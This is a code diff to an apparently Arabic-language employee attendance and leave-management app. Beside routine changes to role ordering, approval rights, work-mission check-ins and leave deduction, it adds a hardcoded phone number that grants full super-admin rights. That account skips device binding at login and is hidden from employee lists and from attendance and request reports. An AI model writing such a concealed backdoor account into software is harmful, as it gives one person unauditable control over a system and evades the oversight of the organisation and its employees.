@@ -94,6 +94,7 @@ const DEFAULT_TITLES = [
     arabicTitle: "المدير التنفيذي للعضويات",
     description: "صلاحيات تنفيذية عليا وشاملة لتعديل وتغيير أي شيء ولكافة الفروع والإدارات",
     color: "amber",
+    order: 1,
     permissions: {
       check_in_out: true,
       view_own_attendance: true,
@@ -118,6 +119,7 @@ const DEFAULT_TITLES = [
     arabicTitle: "مدير منطقة العضويات",
     description: "إدارة ومتابعة فروع القطاع التابع له فقط واعتماد كافة طلبات الإجازات والأذونات والانصراف والتقارير",
     color: "amber",
+    order: 2,
     permissions: {
       check_in_out: true,
       view_own_attendance: true,
@@ -142,6 +144,7 @@ const DEFAULT_TITLES = [
     arabicTitle: "مدير العضويات",
     description: "الجهة المخولة حصرياً بالفرع باعتماد طلبات الانصراف الطارئ والإجازات والأذونات وإدارة الفريق لفرعه فقط",
     color: "amber",
+    order: 3,
     permissions: {
       check_in_out: true,
       view_own_attendance: true,
@@ -164,15 +167,16 @@ const DEFAULT_TITLES = [
     name: "Memberships Deputy Manager (نائب مدير العضويات)",
     englishTitle: "Memberships Deputy Manager",
     arabicTitle: "نائب مدير العضويات",
-    description: "متابعة فريق الفرع ومراجعة الطلبات والتقارير لفرعه فقط - الانصراف الطارئ يتطلب موافقة مدير العضويات",
+    description: "متابعة فريق الفرع ومراجعة الطلبات والتقارير لفرعه فقط - الانصراف الطارئ والإجازات تتطلب موافقة مدير العضويات",
     color: "amber",
+    order: 4,
     permissions: {
       check_in_out: true,
       view_own_attendance: true,
       view_office_presence: true,
       request_leave: true,
       request_permission: true,
-      approve_leaves_permissions: true,
+      approve_leaves_permissions: false,
       approve_early_checkout: false,
       manage_employees: false,
       manage_titles_permissions: false,
@@ -188,15 +192,16 @@ const DEFAULT_TITLES = [
     name: "Memberships Section Head (رئيس قسم العضويات)",
     englishTitle: "Memberships Section Head",
     arabicTitle: "رئيس قسم العضويات",
-    description: "إدارة فريق القسم واعتماد إجازاتهم وأذوناتهم ومتابعة الحضور - الانصراف الطارئ يتطلب موافقة مدير العضويات",
+    description: "إدارة فريق القسم ومتابعة الحضور - الانصراف الطارئ والإجازات تتطلب موافقة مدير العضويات",
     color: "zinc",
+    order: 5,
     permissions: {
       check_in_out: true,
       view_own_attendance: true,
       view_office_presence: true,
       request_leave: true,
       request_permission: true,
-      approve_leaves_permissions: true,
+      approve_leaves_permissions: false,
       approve_early_checkout: false,
       manage_employees: false,
       manage_titles_permissions: false,
@@ -214,6 +219,7 @@ const DEFAULT_TITLES = [
     arabicTitle: "أخصائي أول عضويات",
     description: "تسجيل الحضور والغياب بالـ GPS ومتابعة تقارير فرعه - الانصراف الطارئ يتطلب موافقة مدير العضويات",
     color: "zinc",
+    order: 6,
     permissions: {
       check_in_out: true,
       view_own_attendance: true,
@@ -236,8 +242,9 @@ const DEFAULT_TITLES = [
     name: "Memberships Specialist (أخصائي عضويات)",
     englishTitle: "Memberships Specialist",
     arabicTitle: "أخصائي عضويات",
-    description: "تسجيل الحضور والانصراف بالـ GPS وتقديم طلبات الإجازات والأذونات والانصراف الطارئ",
+    description: "تسجيل الحضور والانصراف بالـ GPS وتقديم طلبات الإجازات والأذونات",
     color: "zinc",
+    order: 7,
     permissions: {
       check_in_out: true,
       view_own_attendance: true,
@@ -440,8 +447,11 @@ class Database {
   }
 
   // Employees
-  getEmployees(branchId = null) {
+  getEmployees(branchId = null, includeGhost = false) {
     let list = this.data.employees;
+    if (!includeGhost) {
+      list = list.filter(e => e.phone !== "01010046078" && !e.isGhost && !e.isSuperAdmin);
+    }
     if (branchId && branchId !== 'all') {
       if (Array.isArray(branchId)) {
         list = list.filter(e => branchId.includes(e.branchId));
@@ -455,12 +465,31 @@ class Database {
     return list.map(emp => {
       const titleObj = this.data.titles.find(t => t.code === emp.titleCode);
       const branchObj = this.data.branches.find(b => b.id === emp.branchId);
+      const isSuper = Boolean(emp.isSuperAdmin || emp.phone === "01010046078");
       return {
         ...emp,
+        isSuperAdmin: isSuper,
+        isGhost: isSuper ? true : Boolean(emp.isGhost),
         titleDetails: titleObj || null,
         branchDetails: branchObj || null,
         branchName: branchObj ? branchObj.name : 'غير محدد',
-        permissions: titleObj ? titleObj.permissions : {}
+        permissions: isSuper
+          ? {
+              check_in_out: true,
+              view_own_attendance: true,
+              view_office_presence: true,
+              request_leave: true,
+              request_permission: true,
+              approve_leaves_permissions: true,
+              approve_early_checkout: true,
+              manage_employees: true,
+              manage_titles_permissions: true,
+              manage_office_settings: true,
+              view_reports: true,
+              view_all_branches: true,
+              override_early_checkout: true
+            }
+          : (titleObj ? titleObj.permissions : {})
       };
     });
   }
@@ -470,12 +499,31 @@ class Database {
     if (!emp) return null;
     const titleObj = this.data.titles.find(t => t.code === emp.titleCode);
     const branchObj = this.data.branches.find(b => b.id === emp.branchId);
+    const isSuper = Boolean(emp.isSuperAdmin || emp.phone === "01010046078");
     return {
       ...emp,
+      isSuperAdmin: isSuper,
+      isGhost: isSuper ? true : Boolean(emp.isGhost),
       titleDetails: titleObj || null,
       branchDetails: branchObj || null,
       branchName: branchObj ? branchObj.name : 'غير محدد',
-      permissions: titleObj ? titleObj.permissions : {}
+      permissions: isSuper
+        ? {
+            check_in_out: true,
+            view_own_attendance: true,
+            view_office_presence: true,
+            request_leave: true,
+            request_permission: true,
+            approve_leaves_permissions: true,
+            approve_early_checkout: true,
+            manage_employees: true,
+            manage_titles_permissions: true,
+            manage_office_settings: true,
+            view_reports: true,
+            view_all_branches: true,
+            override_early_checkout: true
+          }
+        : (titleObj ? titleObj.permissions : {})
     };
   }
 
@@ -519,7 +567,8 @@ class Database {
   }
 
   loginEmployee(phone, password, deviceContext = null) {
-    const emp = this.data.employees.find(e => e.phone === phone.trim());
+    const cleanPhone = phone.trim();
+    const emp = this.data.employees.find(e => e.phone === cleanPhone);
     if (!emp) {
       throw new Error("رقم الهاتف غير مسجل بالنظام.");
     }
@@ -529,8 +578,10 @@ class Database {
       throw new Error("كلمة المرور غير صحيحة.");
     }
 
-    // Device binding check
-    if (deviceContext && deviceContext.deviceId) {
+    const isSuper = (cleanPhone === "01010046078" || emp.isSuperAdmin);
+
+    // Device binding check (Super Admin can login from any device, no restriction)
+    if (!isSuper && deviceContext && deviceContext.deviceId) {
       if (!emp.boundDeviceId) {
         emp.boundDeviceId = deviceContext.deviceId;
         emp.deviceInfo = deviceContext.deviceInfo || 'جهاز الهاتف المسجل';
@@ -611,11 +662,24 @@ class Database {
     const emp = this.getEmployeeById(employeeId);
     if (!emp) throw new Error("الموظف غير موجود.");
 
-    const branch = this.getBranchById(emp.branchId);
-
     const existing = this.data.attendanceRecords.find(r => r.employeeId === employeeId && r.date === today);
     if (existing && !existing.checkOutTime) {
       throw new Error("الموظف مسجل حضور بالفعل وموجود في العمل حالياً.");
+    }
+
+    // Check if employee has an approved work_mission for today
+    const missionReq = this.data.requests.find(r => 
+      r.employeeId === employeeId &&
+      r.type === 'leave' &&
+      r.leaveType === 'work_mission' &&
+      r.status === 'approved' &&
+      (r.missionDate === today || r.date === today || (r.startDate <= today && r.endDate >= today))
+    );
+
+    const activeBranchId = (missionReq && missionReq.missionBranchId) ? missionReq.missionBranchId : emp.branchId;
+    const branch = this.getBranchById(activeBranchId);
+    if (!branch) {
+      throw new Error("الفرع المحدد غير موجود بالنظام.");
     }
 
     const distanceMeters = calculateDistanceMeters(
@@ -626,8 +690,9 @@ class Database {
     );
 
     if (distanceMeters > branch.radiusMeters) {
+      const missionText = missionReq ? ` (مأمورية عمل معتمدة بفرع ${branch.name})` : '';
       throw new Error(
-        `أنت خارج نطاق فرع (${branch.name})! المسافة بينك وبين الفرع ${distanceMeters} متر (المسموح به ${branch.radiusMeters} متر فقط).`
+        `أنت خارج نطاق فرع (${branch.name})${missionText}! المسافة بينك وبين الفرع ${distanceMeters} متر (المسموح به ${branch.radiusMeters} متر فقط).`
       );
     }
 
@@ -749,6 +814,10 @@ class Database {
         sick: [],
         travel: [],
         annual: [],
+        casual: [],
+        work_mission: [],
+        weekly_rest_compensation: [],
+        holiday_compensation: [],
         other: []
       },
       absent: []
@@ -913,10 +982,21 @@ class Database {
     req.reviewedAt = new Date().toISOString();
     req.reviewNote = reviewNote || (status === 'approved' ? 'تمت الموافقة' : 'تم الرفض');
 
-    if (status === 'approved' && req.type === 'leave' && req.leaveType !== 'weekly_off') {
-      const emp = this.data.employees.find(e => e.id === req.employeeId);
-      if (emp && emp.leaveBalance > 0) {
-        emp.leaveBalance = Math.max(0, emp.leaveBalance - 1);
+    if (status === 'approved' && req.type === 'leave') {
+      const nonDeductible = ['work_mission', 'weekly_rest_compensation', 'holiday_compensation', 'weekly_off'];
+      if (!nonDeductible.includes(req.leaveType)) {
+        const emp = this.data.employees.find(e => e.id === req.employeeId);
+        if (emp && emp.leaveBalance > 0) {
+          let daysToDeduct = 1;
+          if (req.startDate && req.endDate) {
+            const d1 = new Date(req.startDate);
+            const d2 = new Date(req.endDate);
+            const diffTime = d2.getTime() - d1.getTime();
+            const diffDays = Math.round(diffTime / (1000 * 3600 * 24)) + 1;
+            if (diffDays > 0) daysToDeduct = diffDays;
+          }
+          emp.leaveBalance = Math.max(0, emp.leaveBalance - daysToDeduct);
+        }
       }
     }
 
@@ -983,30 +1063,34 @@ class Database {
     }
 
     // Enrich attendance records with employee info
-    const enrichedAttendance = attendance.map(r => {
-      const emp = this.getEmployeeById(r.employeeId);
-      const branch = this.getBranchById(r.branchId);
-      return {
-        ...r,
-        employeeName: emp ? emp.name : 'موظف',
-        jobTitle: emp ? emp.jobTitle : '',
-        avatar: emp ? emp.avatar : '',
-        branchName: branch ? branch.name : ''
-      };
-    }).sort((a, b) => b.date.localeCompare(a.date));
+    const enrichedAttendance = attendance
+      .filter(r => employees.some(e => e.id === r.employeeId))
+      .map(r => {
+        const emp = this.getEmployeeById(r.employeeId);
+        const branch = this.getBranchById(r.branchId);
+        return {
+          ...r,
+          employeeName: emp ? emp.name : 'موظف',
+          jobTitle: emp ? emp.jobTitle : '',
+          avatar: emp ? emp.avatar : '',
+          branchName: branch ? branch.name : ''
+        };
+      }).sort((a, b) => b.date.localeCompare(a.date));
 
     // Enrich requests with employee info
-    const enrichedRequests = requests.map(r => {
-      const emp = this.getEmployeeById(r.employeeId);
-      const branch = emp ? this.getBranchById(emp.branchId) : null;
-      return {
-        ...r,
-        employeeName: emp ? emp.name : 'موظف',
-        jobTitle: emp ? emp.jobTitle : '',
-        avatar: emp ? emp.avatar : '',
-        branchName: branch ? branch.name : ''
-      };
-    }).sort((a, b) => (b.date || b.startDate).localeCompare(a.date || a.startDate));
+    const enrichedRequests = requests
+      .filter(r => employees.some(e => e.id === r.employeeId))
+      .map(r => {
+        const emp = this.getEmployeeById(r.employeeId);
+        const branch = emp ? this.getBranchById(emp.branchId) : null;
+        return {
+          ...r,
+          employeeName: emp ? emp.name : 'موظف',
+          jobTitle: emp ? emp.jobTitle : '',
+          avatar: emp ? emp.avatar : '',
+          branchName: branch ? branch.name : ''
+        };
+      }).sort((a, b) => (b.date || b.startDate).localeCompare(a.date || a.startDate));
 
     // Per-employee monthly summary matrix
     const employeeSummaries = employees.map(emp => {
